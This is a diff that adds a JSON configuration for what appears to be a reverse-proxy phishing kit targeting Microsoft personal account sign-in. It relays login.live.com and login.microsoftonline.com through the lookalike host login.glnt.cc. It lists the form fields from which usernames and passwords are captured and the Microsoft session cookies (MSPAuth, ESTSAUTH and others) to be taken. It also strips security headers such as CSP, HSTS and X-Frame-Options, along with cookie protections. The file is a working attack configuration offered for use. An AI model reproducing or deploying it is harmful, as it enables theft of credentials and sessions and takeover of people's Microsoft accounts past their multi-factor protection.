@@ -1,0 +1,37 @@
+{
+  "name": "microsoft-personal",
+  "label": "Microsoft Personal",
+  "upstream": "https://login.live.com",
+  "hostname": "login.glnt.cc",
+  "upstream_hosts": [
+    "https://login.microsoftonline.com"
+  ],
+  "proxy_paths": [
+    "/",
+    "/oauth20_authorize.srf",
+    "/ppsecure/",
+    "/login.srf"
+  ],
+  "credential_fields": {
+    "username": ["loginfmt", "login", "email", "username"],
+    "password": ["passwd", "password", "Password", "secret"]
+  },
+  "session_cookies": [
+    "MSPAuth",
+    "MSPRequ",
+    "MSPOK",
+    "ESTSAUTH",
+    "ESTSAUTHPERSISTENT",
+    "ESTSAUTHLIGHT",
+    "SignInStateCookie"
+  ],
+  "rewrite": {
+    "strip_csp": true,
+    "strip_xfo": true,
+    "strip_hsts": true,
+    "strip_cookie_secure": true,
+    "strip_cookie_domain": true,
+    "rewrite_location": true
+  },
+  "path_map": {}
+}
